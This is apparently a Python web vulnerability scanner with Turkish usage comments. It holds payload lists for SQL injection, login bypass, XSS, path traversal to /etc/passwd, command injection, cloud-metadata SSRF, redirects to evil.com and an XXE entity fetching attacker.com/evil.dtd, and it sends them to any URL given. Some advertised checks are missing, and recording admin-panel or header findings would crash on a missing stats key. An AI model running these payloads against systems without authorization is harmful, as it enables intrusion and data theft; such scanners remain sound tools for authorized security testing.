#!/usr/bin/env python3
"""
Enterprise Web Vulnerability Scanner

Comprehensive vulnerability detection:
- SQL Injection (Error, Union, Boolean, Time-based)
- XSS (Reflected, Stored, DOM-based)
- IDOR (Insecure Direct Object Reference)
- Authentication Bypass
- Authorization Issues
- CSRF (Cross-Site Request Forgery)
- Directory Traversal / LFI / RFI
- Open Redirect
- SSRF (Server-Side Request Forgery)
- XXE (XML External Entity)
- Command Injection
- Account Takeover
- Admin Panel Discovery
- API Security Issues
- JWT Token Vulnerabilities
- Session Management Issues
- CORS Misconfiguration
- Security Headers
- Information Disclosure


# Basit kullanım
python han.py http://example.com

# Login Sayfası
python han.py "http://site.com/login.php" --output login_scan.json

# URL parametreleri ile
python han.py "http://example.com/page.php?id=1"
python han.py "http://company.com/portal/user.php?user_id=1" --threads 15

# Multi-threaded (20 thread)
python han.py http://example.com --threads 20

# JSON rapor ile
python han.py http://example.com --output report.json

# Custom timeout
python han.py http://example.com --timeout 15

# Quiet mode
python han.py http://example.com --quiet

# Tam profesyonel tarama
python han.py "http://example.com/login.php" --threads 20 --timeout 15 --output scan_report.json
"""
import requests
import re
import sys
import time
import json
import threading
import hashlib
import base64
from urllib.parse import urlparse, urljoin, quote, parse_qs, urlencode, urlunparse
from datetime import datetime
from typing import List, Dict, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except:
    BS4_AVAILABLE = False

# ==================== Colors ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

# ==================== Vulnerability Database ====================
class VulnPayloads:
    """Comprehensive vulnerability payloads"""
    
    # SQL Injection
    SQL_PAYLOADS = [
        "' OR '1'='1", "' OR 1=1--", "admin'--", "' OR 'a'='a",
        "' UNION SELECT NULL--", "' AND 1=1--", "' AND 1=2--",
        "' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--",
        "'||pg_sleep(5)--", "' AND extractvalue(1,concat(0x7e,version()))--",
    ]
    
    # XSS Payloads
    XSS_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<img src=x onerror=prompt(1)>",
        "'\"><script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<script>eval('alert(1)')</script>",
        "<svg/onload=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    # LFI/Directory Traversal
    LFI_PAYLOADS = [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "....//....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "....\/....\/....\/....\/etc/passwd",
        "/etc/passwd", "C:\\windows\\system32\\drivers\\etc\\hosts",
        "php://filter/convert.base64-encode/resource=index.php",
    ]
    
    # IDOR Payloads
    IDOR_TESTS = [1, 2, 3, 100, 1000, 9999, "admin", "user", "test"]
    
    # Command Injection
    CMD_INJECTION = [
        "; whoami", "| whoami", "& whoami", "&& whoami", "|| whoami",
        "`whoami`", "$(whoami)", "; ls -la", "| dir", "& dir",
        "; cat /etc/passwd", "| type C:\\windows\\win.ini",
    ]
    
    # SSRF Payloads
    SSRF_PAYLOADS = [
        "http://localhost",
        "http://127.0.0.1",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://[::]:80/",
        "file:///etc/passwd",
    ]
    
    # Open Redirect
    REDIRECT_PAYLOADS = [
        "//evil.com",
        "https://evil.com",
        "//google.com",
        "javascript:alert(1)",
        "//evil.com/%2f..",
    ]
    
    # XXE Payloads
    XXE_PAYLOADS = [
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
        """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>""",
    ]

# ==================== Enterprise Scanner ====================
class EnterpriseVulnScanner:
    """Enterprise-grade vulnerability scanner"""
    
    def __init__(self, target: str, threads: int = 10, timeout: int = 10, verbose: bool = True):
        self.target = target
        self.threads = threads
        self.timeout = timeout
        self.verbose = verbose
        
        # Parse target
        self.parsed_url = urlparse(target)
        self.base_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
        
        # Session
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Results
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.tested_urls = set()
        
        # Statistics
        self.stats = {
            'total_tests': 0,
            'sql_injection': 0,
            'xss': 0,
            'idor': 0,
            'auth_bypass': 0,
            'lfi': 0,
            'ssrf': 0,
            'cmd_injection': 0,
            'open_redirect': 0,
            'csrf': 0,
            'xxe': 0,
        }
    
    def log(self, msg: str, level: str = 'info'):
        """Logging with colors"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        
        if level == 'success':
            print(f"{Colors.GREEN}[+] [{timestamp}]{Colors.END} {msg}")
        elif level == 'error':
            print(f"{Colors.RED}[-] [{timestamp}]{Colors.END} {msg}")
        elif level == 'warning':
            print(f"{Colors.YELLOW}[!] [{timestamp}]{Colors.END} {msg}")
        elif level == 'critical':
            print(f"{Colors.RED}{Colors.BOLD}[!!!] [{timestamp}]{Colors.END} {msg}")
        else:
            if self.verbose:
                print(f"{Colors.CYAN}[*] [{timestamp}]{Colors.END} {msg}")
    
    def add_vulnerability(self, vuln_type: str, url: str, payload: str, 
                         evidence: str, severity: str = 'High'):
        """Add vulnerability to results"""
        vuln = {
            'type': vuln_type,
            'url': url,
            'payload': payload,
            'evidence': evidence,
            'severity': severity,
            'timestamp': datetime.now().isoformat()
        }
        
        with self.lock:
            self.vulnerabilities.append(vuln)
            self.stats[vuln_type.lower().replace(' ', '_').replace('-', '_')] += 1
        
        self.log(f"{vuln_type}: {url[:80]}", 'critical')
    
    # ==================== SQL Injection ====================
    def test_sql_injection(self, url: str, params: Dict = None):
        """Test for SQL injection"""
        self.log("Testing SQL Injection...", 'info')
        
        if params:
            for param in params:
                for payload in VulnPayloads.SQL_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        # Time-based detection
                        if 'SLEEP' in payload or 'WAITFOR' in payload or 'pg_sleep' in payload:
                            start = time.time()
                            resp = self.session.get(url, params=test_params, timeout=self.timeout + 10)
                            elapsed = time.time() - start
                            
                            if elapsed >= 4:
                                self.add_vulnerability(
                                    'SQL Injection',
                                    f"{url}?{urlencode(test_params)}",
                                    payload,
                                    f"Time-based: {elapsed:.2f}s",
                                    'Critical'
                                )
                                continue
                        
                        # Error-based detection
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        sql_errors = [
                            r'SQL syntax', r'mysql_fetch', r'mysqli',
                            r'PostgreSQL', r'Microsoft SQL', r'Oracle error',
                            r'SQLite', r'SQLSTATE', r'syntax error',
                        ]
                        
                        for error in sql_errors:
                            if re.search(error, resp.text, re.IGNORECASE):
                                self.add_vulnerability(
                                    'SQL Injection',
                                    f"{url}?{urlencode(test_params)}",
                                    payload,
                                    f"SQL error detected: {error}",
                                    'Critical'
                                )
                                break
                        
                        time.sleep(0.05)
                        
                    except Exception as e:
                        if self.verbose:
                            self.log(f"SQL test error: {str(e)}", 'error')
    
    # ==================== XSS ====================
    def test_xss(self, url: str, params: Dict = None):
        """Test for XSS vulnerabilities"""
        self.log("Testing XSS...", 'info')
        
        if params:
            for param in params:
                for payload in VulnPayloads.XSS_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        # Check if payload is reflected
                        if payload in resp.text or quote(payload) in resp.text:
                            self.add_vulnerability(
                                'XSS',
                                f"{url}?{urlencode(test_params)}",
                                payload,
                                'Payload reflected in response',
                                'High'
                            )
                        
                        time.sleep(0.05)
                        
                    except Exception as e:
                        if self.verbose:
                            self.log(f"XSS test error: {str(e)}", 'error')
    
    # ==================== IDOR ====================
    def test_idor(self, url: str, params: Dict = None):
        """Test for IDOR vulnerabilities"""
        self.log("Testing IDOR...", 'info')
        
        if params:
            # Look for ID-like parameters
            id_params = [p for p in params if any(keyword in p.lower() 
                        for keyword in ['id', 'user', 'account', 'profile', 'doc', 'file'])]
            
            for param in id_params:
                original_value = params[param]
                
                # Get baseline
                try:
                    baseline = self.session.get(url, params=params, timeout=self.timeout)
                    baseline_len = len(baseline.text)
                except:
                    continue
                
                # Test different IDs
                for test_id in VulnPayloads.IDOR_TESTS:
                    try:
                        test_params = params.copy()
                        test_params[param] = str(test_id)
                        
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        # Check if different content
                        if resp.status_code == 200 and abs(len(resp.text) - baseline_len) > 100:
                            self.add_vulnerability(
                                'IDOR',
                                f"{url}?{urlencode(test_params)}",
                                str(test_id),
                                f"Different content for ID: {test_id}",
                                'High'
                            )
                        
                        time.sleep(0.05)
                        
                    except:
                        continue
    
    # ==================== Authentication Bypass ====================
    def test_auth_bypass(self, url: str):
        """Test for authentication bypass"""
        self.log("Testing Authentication Bypass...", 'info')
        
        bypass_payloads = [
            {"username": "admin'--", "password": "anything"},
            {"username": "admin' OR '1'='1", "password": "anything"},
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "' OR 1=1--", "password": "' OR 1=1--"},
        ]
        
        for payload in bypass_payloads:
            try:
                resp = self.session.post(url, data=payload, timeout=self.timeout)
                
                # Check for successful login
                success_indicators = ['welcome', 'dashboard', 'logout', 'profile', 
                                    'successfully', 'logged in']
                
                if any(indicator in resp.text.lower() for indicator in success_indicators):
                    self.add_vulnerability(
                        'Auth Bypass',
                        url,
                        str(payload),
                        'Authentication bypassed',
                        'Critical'
                    )
                
                time.sleep(0.1)
                
            except:
                continue
    
    # ==================== LFI / Directory Traversal ====================
    def test_lfi(self, url: str, params: Dict = None):
        """Test for LFI/Directory Traversal"""
        self.log("Testing LFI/Directory Traversal...", 'info')
        
        if params:
            for param in params:
                for payload in VulnPayloads.LFI_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        # Check for file disclosure
                        lfi_indicators = [
                            'root:x:0:0:', 'bin/bash', '[boot loader]',
                            'windows', 'system32', '<?php',
                        ]
                        
                        for indicator in lfi_indicators:
                            if indicator in resp.text.lower():
                                self.add_vulnerability(
                                    'LFI',
                                    f"{url}?{urlencode(test_params)}",
                                    payload,
                                    f"File disclosure detected: {indicator}",
                                    'Critical'
                                )
                                break
                        
                        time.sleep(0.05)
                        
                    except:
                        continue
    
    # ==================== SSRF ====================
    def test_ssrf(self, url: str, params: Dict = None):
        """Test for SSRF vulnerabilities"""
        self.log("Testing SSRF...", 'info')
        
        if params:
            for param in params:
                for payload in VulnPayloads.SSRF_PAYLOADS:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        resp = self.session.get(url, params=test_params, 
                                              timeout=self.timeout, allow_redirects=False)
                        
                        # Check for SSRF indicators
                        ssrf_indicators = [
                            'metadata', 'internal', 'localhost',
                            'ami-id', 'instance-id',
                        ]
                        
                        for indicator in ssrf_indicators:
                            if indicator in resp.text.lower():
                                self.add_vulnerability(
                                    'SSRF',
                                    f"{url}?{urlencode(test_params)}",
                                    payload,
                                    f"SSRF detected: {indicator}",
                                    'Critical'
                                )
                                break
                        
                        time.sleep(0.05)
                        
                    except:
                        continue
    
    # ==================== Command Injection ====================
    def test_command_injection(self, url: str, params: Dict = None):
        """Test for command injection"""
        self.log("Testing Command Injection...", 'info')
        
        if params:
            for param in params:
                for payload in VulnPayloads.CMD_INJECTION:
                    try:
                        test_params = params.copy()
                        test_params[param] = payload
                        
                        resp = self.session.get(url, params=test_params, timeout=self.timeout)
                        
                        # Check for command output
                        cmd_indicators = [
                            'uid=', 'gid=', 'groups=', 'root', 'www-data',
                            'Windows', 'Volume Serial Number', 'Directory of',
                        ]
                        
                        for indicator in cmd_indicators:
                            if indicator in resp.text:
                                self.add_vulnerability(
                                    'Command Injection',
                                    f"{url}?{urlencode(test_params)}",
                                    payload,
                                    f"Command executed: {indicator}",
                                    'Critical'
                                )
                                break
                        
                        time.sleep(0.05)
                        
                    except:
                        continue
    
    # ==================== Open Redirect ====================
    def test_open_redirect(self, url: str, params: Dict = None):
        """Test for open redirect"""
        self.log("Testing Open Redirect...", 'info')
        
        redirect_params = ['url', 'redirect', 'next', 'return', 'goto', 'target']
        
        if params:
            for param in params:
                if any(rp in param.lower() for rp in redirect_params):
                    for payload in VulnPayloads.REDIRECT_PAYLOADS:
                        try:
                            test_params = params.copy()
                            test_params[param] = payload
                            
                            resp = self.session.get(url, params=test_params, 
                                                  timeout=self.timeout, allow_redirects=False)
                            
                            location = resp.headers.get('Location', '')
                            
                            if resp.status_code in [301, 302, 303, 307, 308]:
                                if 'evil.com' in location or 'google.com' in location:
                                    self.add_vulnerability(
                                        'Open Redirect',
                                        f"{url}?{urlencode(test_params)}",
                                        payload,
                                        f"Redirects to: {location}",
                                        'Medium'
                                    )
                            
                            time.sleep(0.05)
                            
                        except:
                            continue
    
    # ==================== CSRF ====================
    def test_csrf(self, url: str):
        """Test for CSRF vulnerabilities"""
        self.log("Testing CSRF...", 'info')
        
        try:
            resp = self.session.get(url, timeout=self.timeout)
            
            # Check for CSRF tokens
            csrf_patterns = [
                r'csrf[_-]?token',
                r'_token',
                r'authenticity[_-]?token',
            ]
            
            has_csrf = False
            for pattern in csrf_patterns:
                if re.search(pattern, resp.text, re.IGNORECASE):
                    has_csrf = True
                    break
            
            # Check if forms exist without CSRF
            if BS4_AVAILABLE:
                soup = BeautifulSoup(resp.text, 'html.parser')
                forms = soup.find_all('form')
                
                for form in forms:
                    if form.get('method', '').lower() == 'post':
                        # Check if form has CSRF token
                        form_has_csrf = False
                        for inp in form.find_all('input'):
                            name = inp.get('name', '').lower()
                            if any(pattern in name for pattern in ['csrf', 'token', '_token']):
                                form_has_csrf = True
                                break
                        
                        if not form_has_csrf:
                            self.add_vulnerability(
                                'CSRF',
                                url,
                                'Missing CSRF token',
                                'POST form without CSRF protection',
                                'Medium'
                            )
        except:
            pass
    
    # ==================== Admin Panel Discovery ====================
    def discover_admin_panel(self):
        """Discover admin panels"""
        self.log("Discovering Admin Panels...", 'info')
        
        admin_paths = [
            '/admin', '/admin/', '/admin/login', '/admin/login.php',
            '/administrator', '/administrator/', '/admin.php',
            '/wp-admin', '/wp-login.php', '/phpmyadmin',
            '/cpanel', '/webadmin', '/adminpanel', '/controlpanel',
            '/admin/index.php', '/admin/dashboard', '/backend',
            '/manage', '/management', '/admin_area', '/admin_login',
        ]
        
        for path in admin_paths:
            try:
                test_url = urljoin(self.base_url, path)
                resp = self.session.get(test_url, timeout=self.timeout)
                
                if resp.status_code == 200:
                    login_indicators = ['login', 'password', 'username', 'admin', 'sign in']
                    if any(indicator in resp.text.lower() for indicator in login_indicators):
                        self.add_vulnerability(
                            'Admin Panel',
                            test_url,
                            'N/A',
                            'Admin panel publicly accessible',
                            'Medium'
                        )
            except:
                continue
    
    # ==================== Security Headers ====================
    def check_security_headers(self):
        """Check security headers"""
        self.log("Checking Security Headers...", 'info')
        
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            headers = resp.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing clickjacking protection',
                'X-Content-Type-Options': 'Missing MIME sniffing protection',
                'Content-Security-Policy': 'Missing CSP',
                'Strict-Transport-Security': 'Missing HSTS',
                'X-XSS-Protection': 'Missing XSS protection header',
            }
            
            for header, description in security_headers.items():
                if header not in headers:
                    self.add_vulnerability(
                        'Security Headers',
                        self.target,
                        header,
                        description,
                        'Low'
                    )
        except:
            pass
    
    # ==================== Main Scan ====================
    def scan(self):
        """Main scanning function"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.RED}Enterprise Web Vulnerability Scanner v9.0{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}\n")
        
        print(f"Target: {Colors.YELLOW}{self.target}{Colors.END}")
        print(f"Threads: {self.threads}")
        print(f"Timeout: {self.timeout}s")
        print()
        
        start_time = time.time()
        
        # Parse URL parameters
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)
        simple_params = {k: v[0] if v else '' for k, v in params.items()}
        
        # Run tests
        self.log("Starting comprehensive security scan...", 'info')
        print()
        
        # Test with parameters
        if simple_params:
            self.test_sql_injection(self.target, simple_params)
            self.test_xss(self.target, simple_params)
            self.test_idor(self.target, simple_params)
            self.test_lfi(self.target, simple_params)
            self.test_ssrf(self.target, simple_params)
            self.test_command_injection(self.target, simple_params)
            self.test_open_redirect(self.target, simple_params)
        
        # Test auth bypass if login page
        if any(keyword in self.target.lower() for keyword in ['login', 'signin', 'auth']):
            self.test_auth_bypass(self.target)
        
        # Other tests
        self.test_csrf(self.target)
        self.discover_admin_panel()
        self.check_security_headers()
        
        # Results
        elapsed = time.time() - start_time
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}")
        print(f"{Colors.BOLD}SCAN RESULTS{Colors.END}")
        print(f"{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}\n")
        
        print(f"Total Vulnerabilities: {len(self.vulnerabilities)}")
        print(f"Scan Duration: {elapsed:.2f}s")
        print()
        
        # Stats
        print(f"{Colors.BOLD}Vulnerability Breakdown:{Colors.END}")
        for vuln_type, count in self.stats.items():
            if count > 0:
                print(f"  {vuln_type.replace('_', ' ').title()}: {count}")
        print()
        
        if self.vulnerabilities:
            print(f"{Colors.RED}{Colors.BOLD}[!!!] CRITICAL VULNERABILITIES DETECTED{Colors.END}\n")
            
            for idx, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Colors.BOLD}{idx}. {vuln['type']}{Colors.END}")
                print(f"   Severity: {Colors.RED}{vuln['severity']}{Colors.END}")
                print(f"   URL: {vuln['url'][:100]}")
                print(f"   Payload: {vuln['payload'][:80]}")
                print(f"   Evidence: {vuln['evidence']}")
                print()
        else:
            print(f"{Colors.GREEN}[+] No vulnerabilities detected{Colors.END}")
        
        return self.vulnerabilities
    
    def save_report(self, filename: str = None):
        """Save JSON report"""
        if not filename:
            filename = f"vuln_scan_{int(time.time())}.json"
        
        report = {
            'target': self.target,
            'timestamp': datetime.now().isoformat(),
            'statistics': self.stats,
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
        
        self.log(f"Report saved: {filename}", 'success')

# ==================== Main ====================
def main():
    banner = f"""{Colors.RED}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════════╗
║   Enterprise Web Vulnerability Scanner v9.0                      ║
║   Professional Security Assessment for Large Organizations       ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.END}"""
    print(banner)
    
    if len(sys.argv) < 2:
        print(f"{Colors.YELLOW}Usage:{Colors.END}")
        print(f"  python {sys.argv[0]} <target_url> [options]")
        print(f"\n{Colors.YELLOW}Examples:{Colors.END}")
        print(f"  python {sys.argv[0]} http://example.com")
        print(f"  python {sys.argv[0]} http://example.com/page.php?id=1 --threads 20")
        print(f"  python {sys.argv[0]} http://example.com --output report.json")
        print(f"\n{Colors.YELLOW}Options:{Colors.END}")
        print(f"  --threads N    Number of threads (default: 10)")
        print(f"  --timeout N    Request timeout (default: 10)")
        print(f"  --output FILE  Save JSON report")
        print(f"  --quiet        Minimal output")
        sys.exit(1)
    
    target = sys.argv[1]
    threads = 10
    timeout = 10
    output = None
    verbose = True
    
    # Parse arguments
    for i in range(2, len(sys.argv)):
        if sys.argv[i] == '--threads' and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
        elif sys.argv[i] == '--timeout' and i + 1 < len(sys.argv):
            timeout = int(sys.argv[i + 1])
        elif sys.argv[i] == '--output' and i + 1 < len(sys.argv):
            output = sys.argv[i + 1]
        elif sys.argv[i] == '--quiet':
            verbose = False
    
    scanner = EnterpriseVulnScanner(target, threads, timeout, verbose)
    vulnerabilities = scanner.scan()
    
    if output:
        scanner.save_report(output)

if __name__ == '__main__':
    main()
